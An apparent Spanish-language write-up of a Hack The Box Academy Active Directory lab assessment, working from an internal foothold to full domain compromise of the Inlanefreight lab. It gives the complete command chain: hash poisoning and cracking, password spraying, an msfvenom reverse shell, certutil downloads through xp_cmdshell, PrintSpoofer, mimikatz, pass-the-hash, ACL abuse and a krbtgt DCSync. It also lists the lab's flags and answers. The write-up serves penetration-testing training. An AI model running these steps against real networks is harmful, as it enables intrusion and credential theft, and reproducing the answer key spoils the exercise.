## Escenario

Nuestro cliente Inlanefreight nos ha contratado nuevamente para realizar una prueba de penetración interna de alcance completo. El cliente busca encontrar y remediar tantas fallas como sea posible antes de pasar por un proceso de fusión y adquisición. El nuevo CISO está particularmente preocupado por fallas de seguridad de AD más matizadas que pueden haber pasado desapercibidas durante pruebas de penetración anteriores. El cliente no está preocupado por tácticas sigilosas/evasivas y también nos ha proporcionado una VM Parrot Linux dentro de la red interna para obtener la mejor cobertura posible de todos los ángulos de la red y el entorno de Active Directory. Conéctate al host de ataque interno vía SSH (también puedes conectarte usando `xfreerdp` como se muestra al principio de este módulo) y comienza a buscar un punto de apoyo en el dominio. Una vez que tengas un punto de apoyo, enumera el dominio y busca fallas que puedan utilizarse para moverte lateralmente, escalar privilegios y lograr el compromiso del dominio.

Aplica lo aprendido en este módulo para comprometer el dominio y responde las preguntas a continuación para completar la parte II de la evaluación de habilidades.

##### 1. _Obtén un hash de contraseña para una cuenta de usuario de dominio que pueda aprovecharse para obtener un punto de apoyo en el dominio. ¿Cuál es el nombre de la cuenta?_

Lo primero de todo es conectarnos por SSH a la IP que nos dan con las siguientes credenciales:

```
User: htb-student
Pass: HTB_@cademy_stdnt!
```

![[Pasted image 20251222160934.png]]
Una vez dentro, listamos las interfaces de red. Nos interesa la siguiente:

```bash
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:76:6f brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet 172.16.7.240/23 brd 172.16.7.255 scope global noprefixroute ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::2957:2d31:5225:229a/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

Ejecutamos `responder` con la interfaz de red `ens224` para intentar capturar el hash de alguien. Sabemos que es dicha interfaz porque el rango `172.16.X.X` corresponde a una red privada, además con `ip route`:

```bash
└──╼ $ip route
default via 10.129.0.1 dev ens192 proto dhcp metric 100 
default via 172.16.7.1 dev ens224 proto static metric 101 
10.129.0.0/16 dev ens192 proto kernel scope link src 10.129.193.185 metric 100 
172.16.6.0/23 dev ens224 proto kernel scope link src 172.16.7.240 metric 101 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
```

Esperamos un poco y confirmamos hash obtenido:

![[Pasted image 20251222161251.png | 600]]

```bash
┌─[htb-student@skills-par01]─[~]
└──╼ $ls /usr/share/responder/logs
Analyzer-Session.log  Config-Responder.log  Poisoners-Session.log  Responder-Session.log  SMB-NTLMv2-SSP-172.16.7.3.txt
```

Simplemente mostramos el contenido. 

> **Respuesta**: AB920
##### 2. _¿Cuál es la contraseña en texto claro de este usuario?_

Esta es fácil. Crackeamos el hash:

```bash
❯ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash_AB920.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
weasal           (AB920)     
1g 0:00:00:00 DONE (2025-12-22 16:16) 4.166g/s 1211Kp/s 1211Kc/s 1211KC/s winers..temyong
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

> **Respuesta**: weasal
##### 3. _Envía el contenido del archivo C:\flag.txt en MS01._

Primero identificamos con `fping` qué hosts se encuentran activos en el dominio:

```bash
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $fping -asgq 172.16.7.0/23
172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240
```

Guardamos dichas IPs en un archivo txt para luego hacer un análisis con nmap. Tras lanzar el escaneo detallado obtenemos la siguiente información:

```bash
...SNIP...

Nmap scan report for 172.16.7.50
Host is up (0.0012s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-22T15:22:18+00:00; +17s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-22T15:22:10+00:00
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Issuer: commonName=MS01.INLANEFREIGHT.LOCAL

...SNIP...
```

- **172.16.7.3** : `DC01`
- **172.16.7.50** : `MS01`
- **172.16.7.60** : `SQL01`
- **172.16.7.240** : `Nuestra máquina Parrot` (_A la que estamos conectados por SSH)

Ahora que hemos identificado la IP de MS01 procedemos a verificar si podemos entrar de alguna manera con el usuario y credenciales capturadas:

```bash
┌─[✗]─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $crackmapexec smb 172.16.7.50 -u 'AB920' -p 'weasal'
SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.50     445    MS01             [+] INLANEFREIGHT.LOCAL\AB920:weasal 

┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $crackmapexec winrm 172.16.7.50 -u 'AB920' -p 'weasal'
WINRM       172.16.7.50     5985   NONE             [*] None (name:172.16.7.50) (domain:None)
WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/wsman
WINRM       172.16.7.50     5985   NONE             [+] None\AB920:weasal (Pwn3d!)
```

Como vemos, con winrm aparece `Pwn3d!` lo que indica que tenemos acceso completo. Por tanto el siguiente paso es usar `evil-winrm`:

```bash
evil-winrm -i 172.16.7.50 -u 'ab920' -p 'weasal'
```

Obtenemos la flag:

![[Pasted image 20251222162926.png | 700]]

> **Respuesta**: aud1t_gr0up_m3mbersh1ps!
##### 4. _Usa un método común para obtener credenciales débiles de otro usuario. Envía el nombre de usuario del usuario cuyas credenciales obtienes._

Nos dicen que usemos un método común para obtener credenciales débiles de otros usuarios. Vamos a probar con un ataque de _password spraying_. Primero, aprovechando crackmapexec, sacamos usuarios del controlador de dominio (DC01) que como hemos visto en el escaneo con nmap previo, corresponde a la IP `172.16.7.3`.

```
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee users.txt
...SNIP...

┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $cat users.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt

┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $wc -l users.txt 
2904 users.txt
```

> _Explicación del segundo comando_:

```
cut -d'\' -f2     # Divide por \ y toma campo 2
awk -F " "        # Divide por espacio
awk -F ":"        # Divide por :
awk -F ","        # Divide por ,
```

Vemos 2904 usuarios en el DC. Procedemos a usar `kerbrute` para hacer el ataque:

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
```

Utilizamos la lista de usuarios válidos, apuntamos al dominio y la IP correcta del DC y usamos la contraseña `Welcome1`. Tras esperar unos segundos...

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 12/22/25 - Ronnie Flathers @ropnop

2025/12/22 10:52:51 >  Using KDC(s):
2025/12/22 10:52:51 >  	172.16.7.3:88

2025/12/22 10:53:07 >  [+] VALID LOGIN:	BR086@inlanefreight.local:Welcome1
2025/12/22 10:53:07 >  Done! Tested 2904 logins (1 successes) in 16.334 seconds
```

> **Respuesta**: BR086
##### 5. _¿Cuál es la contraseña de este usuario?_

Ya la hemos obtenido

> **Respuesta**: Welcome1
##### 6. _Localiza un archivo de configuración que contenga una cadena de conexión MSSQL. ¿Cuál es la contraseña del usuario listado en este archivo?_

Utilizamos `smbmap` para realizar la enumeración de shares y así, identificar shares para los que este usuario tenga permisos de lectura.

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3
[+] IP: 172.16.7.3:445	Name: inlanefreight.local                               
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	Share for department users
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

Los shares `IPC$` , `NETLOGON` y `SYSVOL` no nos interesan, sin embargo, `Department Shares` sí que puede contener información útil. Listamos su contenido de forma recursiva:

```bash
smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares'
```

_Usamos `-R` para que busque de manera recursiva con una profundidad por defecto de 1._

![[Pasted image 20251222170035.png | 600]]

Ahora descargamos dicho web.config con la opción `-A`:

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares' -A web.config
[+] IP: 172.16.7.3:445	Name: inlanefreight.local                               
[+] Starting search for files matching 'web.config' on share Department Shares.
[+] Match found! Downloading: Department Shares\IT\Private\Development\web.config
```

Y mostramos su contenido. Dentro está la respuesta

> **Respuesta**: D@ta_bAse_adm1n!
##### 7. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en el host SQL01._

El archivo web.config que hemos descargado contenía la siguiente información:

```xml
</masterDataServices>  
       <connectionStrings>
           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
       </connectionStrings>
  </system.web>
</configuration>
```

Vemos que tenemos las credenciales `netdb:D@ta_bAse_adm1n!`. Hacemos una conexión contra SQL01, que como hemos visto al principio, corresponde a la IP `172.16.7.60`.

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $python3 /usr/local/bin/mssqlclient.py inlanefreight/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

Una vez dentro, vemos que no tenemos permisos suficientes para abrinos una shell. Por tanto, vamos a revisar primero qué permisos tenemos:

```SQL
EXEC xp_cmdshell 'whoami /priv'
...SNIP...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

Ese privilegio es muy importante. Básicamente es vulnerable a ataques de token impersonation. Podemos aprovechar para escalar nuestros privilegios haciendo uso de la vulnerabilidad `PrintNightmare`. Antes de eso, para que el payload funcione, abrimos en un nuevo terminal una sesión SSH para conectarnos a Parrot. Generamos el payload para la reverse shell:

```bash
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

En la máquina Parrot abrimos un servidor Python para poder descargar tanto PrintSpoofer como la shell que acabamos de obtener. Para descargar PrintSpoofer, primero la enviamos de nuestro Kali a la Parrot, y de la Parrot irá a la máquina SQL, por tanto el flujo es:

`Kali (10.10.14.217) > Parrot (10.129.193.185) > SQL01 (172.16.7.60)`

```bash
# Kali
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe

❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.193.185 - - [22/Dec/2025 17:30:25] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

# Parrot
┌─[htb-student@skills-par01]─[~/Desktop/Lab2]
└──╼ $wget http://10.10.14.217:8000/PrintSpoofer.exe
...SNIP...

PrintSpoofer.exe.1                        100%[===================================================================================>]  26,50K  --.-KB/s    en 0,1s    

2025-12-22 11:30:02 (251 KB/s) - «PrintSpoofer.exe.1» guardado [27136/27136]
```

Levantamos el servidor python en el Parrot, y desde la sesión con SQL descargamos tanto la shell como PrintSpoofer.exe:

```bash
SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/PrintSpoofer.exe C:\Users\Public\PrintSpoofer.exe"
SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/shell.exe C:\Users\Public\shell.exe"
```

Volvemos a la máquina Parrot y levantamos el listener con Metasploit. 

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.7.240
set LPORT 1335
```

Y en la sesión con SQL:

```bash
xp_cmdshell C:\Users\Public\PrintSpoofer.exe -c C:\Users\Public\shell.exe
```

Obtendremos la sesión meterpreter:

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.7.240:1335 
[*] Sending stage (200262 bytes) to 172.16.7.60
[*] Meterpreter session 1 opened (172.16.7.240:1335 -> 172.16.7.60:58566 ) at 2025-12-22 11:43:35 -0500

meterpreter > shell
Process 1424 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>more C:\Users\administrator\Desktop\flag.txt
more C:\Users\administrator\Desktop\flag.txt
s3imp3rs0nate_cl@ssic

C:\Windows\system32>
```

> **Respuesta**: s3imp3rs0nate_cl@ssic
##### 8. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en el host MS01._

Tenemos semi-privilegios en el servidor SQL01, el siguiente paso es intentar obtener el hash del administrador. Usamos mimikatz:

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.


meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : SQL01
SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6
```

Debajo saldrá el hash del administrador: `bdaffbfe64f1fc646a3353be1c2c3c99`. Realizamos un PtH con evil-winrm:

```bash
evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```

![[Pasted image 20251222175332.png]]

> **Respuesta**: exc3ss1ve_adm1n_r1ights!
##### 9. _Obtén credenciales para un usuario que tenga derechos GenericAll sobre el grupo Domain Admins. ¿Cuál es el nombre de cuenta de este usuario?_

Nos subimos PowerView.ps1 a la máquina en la que tenemos acceso con Evil-WinRM. El flujo es igual que antes: Kali -> Parrot -> Máquina Windows. Una vez tengamos el servidor Python en la Parrot corriendo, desde la sesión con Evil-WinRM:

```powershell
certutil.exe -urlcache -f http://172.16.7.240:8000/PowerView.ps1 .\PowerView.ps1
Import-Module .\PowerView.ps1
```

Obtenemos el SID del administrador de dominio:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> ConvertTo-Sid "Domain Admins"
S-1-5-21-3327542485-274640656-2609762496-512
```

Sin embargo, si intentamos enumerar los ACLs de esta máquina, nos encontraremos con errores. 

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-DomainObjectAcl -Identity "S-1-5-21-3327542485-274640656-2609762496-512" -ResolveGUID
[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest
    + CategoryInfo          : OperationStopped: ([Get-DomainGUID...from Get-Forest:String) [], RuntimeException
    + FullyQualifiedErrorId : [Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest
```

Por tanto, usaremos una sesión Meterpreter desde otra sesión con Parrot:

```bash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set LHOST 172.16.7.240
msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.7.50
msf6 exploit(windows/smb/psexec) > set smbuser administrator
msf6 exploit(windows/smb/psexec) > set smbpass 00000000000000000000000000000000:bdaffbfe64f1fc646a3353be1c2c3c99
msf6 exploit(windows/smb/psexec) > exploit

# El formato `00000000....:hash` es simplemente **Pass-the-Hash** indicando:

- "No tengo/No uso el LM Hash antiguo (por eso ceros)"
- "Usa solo el NTLM Hash moderno para autenticar"

[*] Started reverse TCP handler on 172.16.7.240:4444 
[*] 172.16.7.50:445 - Connecting to the server...
[*] 172.16.7.50:445 - Authenticating to 172.16.7.50:445 as user 'administrator'...
[*] 172.16.7.50:445 - Selecting PowerShell target
[*] 172.16.7.50:445 - Executing the payload...
[+] 172.16.7.50:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 172.16.7.50
[*] Meterpreter session 1 opened (172.16.7.240:4444 -> 172.16.7.50:49728 ) at 2025-12-23 10:03:22 -0500

meterpreter > load powershell
meterpreter > powershell_shell
```

Desde la sesión powershell de meterpreter importamos el módulo `PowerView.ps1` y continuamos.

```powershell
PS > Get-DomainObjectAcl -Identity "S-1-5-21-3327542485-274640656-2609762496-512" -ResolveGUID
```

Nos dará múltiples ACLs. Filtramos por _GenericAll_ con `Get-DomainObjectAcl -Identity "S-1-5-21-3327542485-274640656-2609762496-512" | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}`

![[Pasted image 20251223161309.png]]

* **ObjectDN**: Nombre distinguido (Distinguished Name) del objeto sobre el cual se aplica el permiso. Formato LDAP que identifica la ubicación del objeto en el directorio. * 
* **ObjectSID**: Security Identifier del objeto objetivo. Identificador único e inmutable del objeto sobre el cual se aplica el ACE. 
* **ActiveDirectoryRights**: Tipo de permiso otorgado. Define qué acciones puede realizar el principal sobre el objeto (GenericAll, GenericWrite, WriteDacl, etc.). 
* **BinaryLength**: Longitud del ACE en bytes cuando se almacena en formato binario. 
* **AceQualifier**: Indica si el ACE otorga o deniega permisos. Valores: `AccessAllowed` (concede) o `AccessDenied` (deniega). 
* **IsCallback**: Indica si el ACE requiere evaluación condicional adicional mediante callback. `False` = ACE estándar, `True` = ACE condicional. 
* **OpaqueLength**: Longitud de datos opacos adicionales específicos de aplicación. Generalmente 0 (sin datos adicionales). 
* **AccessMask**: Representación numérica binaria de los permisos. Cada bit representa un permiso específico que Active Directory usa internamente. 
* **SecurityIdentifier**: SID del principal (usuario/grupo) que tiene el permiso. Identifica QUIÉN tiene el derecho sobre el objeto objetivo. 
* **AceType**: Clasificación específica del tipo de ACE. Generalmente coincide con AceQualifier (AccessAllowed, AccessDenied, etc.). 
* **AceFlags**: Flags que controlan cómo se hereda el ACE a objetos hijos. Valores: `None`, `ContainerInherit`, `ObjectInherit`, `InheritOnly`. 
* **IsInherited**: Indica si el permiso fue heredado de un objeto padre (`True`) o configurado directamente en este objeto (`False`). 
* **InheritanceFlags**: Define cómo se heredan los permisos a objetos descendientes. Mismo concepto que AceFlags en diferente representación. 
* **PropagationFlags**: Controla cómo se propaga la herencia a través de la jerarquía. Valores: `None` (propagación normal), `NoPropagateInherit`, `InheritOnly`. 
* **AuditFlags**: Configuración de auditoría para este ACE. Valores: `None` (sin auditoría), `Success` (auditar accesos exitosos), `Failure` (auditar fallos).

De ahí vemos dos SIDs. Nos sirve el primero porque: 
1. **Empieza con `S-1-5-21-`** → Identifica un usuario/grupo del dominio (explotable) 
2. **El segundo es `S-1-5-18`** → Es NT AUTHORITY\SYSTEM (cuenta built-in, no explotable) 
3. **Solo los SIDs de dominio (`S-1-5-21-*`) representan usuarios reales** de los que podemos obtener credenciales 
4. **Las cuentas built-in (`S-1-5-18`, `S-1-5-19`, `S-1-5-32-*`) no son vectores de ataque** válidos en pentesting Por tanto, el SID `S-1-5-21-3327542485-274640656-2609762496-4611` (CT059) es el objetivo a comprometer.

- `S-1-5-21-...-512` = Domain Admins 
- `S-1-5-21-...-RID` = Usuarios del dominio ✅ 
- `S-1-5-18` = SYSTEM (ignorar) ❌ 
- `S-1-5-19` = LOCAL SERVICE (ignorar) ❌ 
- `S-1-5-32-*` = Built-in groups (ignorar) ❌

```powershell
PS > Convert-SidtoName "S-1-5-21-3327542485-274640656-2609762496-4611"    
INLANEFREIGHT\CT059
```

> **Respuesta**: CT059
##### 10. _Crackea el hash de contraseña de este usuario y envía la contraseña en texto claro como respuesta._

Para resolver esto vamos a usar `Inveigh.ps1`. Lo descargamos en nuestro Kali, lo movemos a la Parrot y de ahí, a la máquina Windows. 

```bash
# Kali
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1

# Movemos como siempre con un servidor python... y en la sesión powershell con meterpreter:
certutil.exe -urlcache -f http://172.16.7.240:8000/Inveigh.ps1 .\Inveigh.ps1
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y LLMNR Y -ConsoleOutput Y -FileOutput Y
```

Tras esperar un poco, obtendremos el hash:

```bash
CT059::INLANEFREIGHT:6F404933E4B53368:65A3A98A63C1A3DADF1B1CCE32C408CE:0101000000000000270F12852174DC010C50D36B15157DE80000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800270F12852174DC0106000400020000000800300030000000000000000000000000200000EDFFF126C16E0569EF61DBA7B04FAF04A2480539EEC06AA5E3245F4DD1C9A56C0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
```

Y lo intentamos descifrar:

```bash
hashcat -m 5600 hash_CT059.hash /usr/share/wordlists/rockyou.txt
```

> **Respuesta**: charlie1
##### 11. _Envía el contenido del archivo flag.txt en el escritorio del Administrator en el host DC01._

El usuario **CT059** tiene permisos _GenericAll_. Por tanto, podemos proceder a añadir este usuario al grupo de Administradores de dominio e iniciar un ataque DCSync. Configuramos proxychains en la máquina Kali para enrutar el tráfico a través de un proxy SOCKS4 en el puerto 9050. De esta forma, podremos autenticarnos en la máquina **MS01** usando las credenciales del usuario **CT059**.

```bash
# Kali
sudo nano /etc/proxychains.conf

...SNIP...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

Después, establecemos una conexión SSH y creamos un proxy SOCKS en el puerto local 9050:

```bash
# Kali
ssh -D 9050 htb-student@10.129.147.191

# Kali en una nueva sesión
proxychains xfreerdp3 /v:172.16.7.50 /u:CT059 /p:charlie1 /d:inlanefreight.local /dynamic-resolution /drive:Shared,//home/kali/Escritorio/HTB/Academy/ActiveDirectory/Lab2
```

![[Pasted image 20251223165117.png]]

Procedemos a añadir esta cuenta al grupo de administradores de dominio.

```powershell
PS C:\Users\CT059> net group 'Domain Admins' ct059 /add /domain
```

Nos avisará de que se ha ejecutado con éxito el comando. Como ya somos administradores de dominio con este usuario, podemos lanzar una sesión nueva en DC01 (172.16.7.3):

```powershell
$cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\CT059", (ConvertTo-SecureString "charlie1" -AsPlainText -Force))
Enter-PSSession -ComputerName DC01 -Credential $cred
```

![[Pasted image 20251223165408.png]]

> **Respuesta**: acLs_f0r_th3_w1n!
##### 12. _Envía el hash NTLM para la cuenta KRBTGT del dominio objetivo después de lograr el compromiso del dominio._

Desde la máquina Parrot, ejecutamos impacket-secretsdump:

```bash
impacket-secretsdump inlanefreight.local/CT059:charlie1@172.16.7.3 -just-dc-user krbtgt
```

![[Pasted image 20251223170624.png | 800]]

**Campos:**
- `krbtgt` - Nombre de usuario
- `502` - RID (Relative ID) de la cuenta KRBTGT (siempre 502)
- `aad3b435b51404eeaad3b435b51404ee` - LM Hash vacío/deshabilitado
- `7eba70412d81c1cd030d72a3e8dbe05f` - **NTLM Hash** 

> **Respuesta**: 7eba70412d81c1cd030d72a3e8dbe05f